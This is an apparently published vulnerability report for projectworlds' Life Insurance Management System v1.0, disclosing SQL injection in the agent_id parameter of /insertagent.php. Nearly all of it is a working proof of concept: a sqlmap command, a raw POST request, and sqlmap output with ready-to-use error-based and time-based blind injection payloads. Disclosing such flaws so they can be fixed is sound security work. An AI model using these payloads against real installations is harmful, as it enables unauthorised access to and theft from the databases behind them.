

# SQLi vulnerability in Life Insurance Management System v1.0 of file /insertagent.php with param 'agent_id'

**vender**:

- projectworlds

**SoftLink**:

- [Life Insurance Management System in PHP | Projectworlds](https://projectworlds.in/life-insurance-management-system-in-php/)

**Vulnerable File**

- /insertagent.php

**Version**

- V1.0

### POC

```bash
sqlmap -r request.txt --level 5 --batch
```

```http
POST /insertagent.php HTTP/1.1
Host: www.lims.top
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Referer: http://www.lims.top/addAgent.php
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Priority: u=0, i
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Origin: http://www.lims.top
Cookie: PHPSESSID=sqvuccn7rsiqr9bhq7p29tfds2
Content-Length: 51

agent_id=1&agent_password=1&name=1&branch=1&phone=1
```



```
Parameter: agent_id (POST)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: agent_id=1' AND GTID_SUBSET(CONCAT(0x7162716b71,(SELECT (ELT(3526=3526,1))),0x716a7a7171),3526) AND 'YiUo'='YiUo&agent_password=1&name=1&branch=1&phone=1

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: agent_id=1' AND (SELECT 4720 FROM (SELECT(SLEEP(5)))vecG) AND 'TwxH'='TwxH&agent_password=1&name=1&branch=1&phone=1
```

![image-20250609053914700](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202506090539874.png)
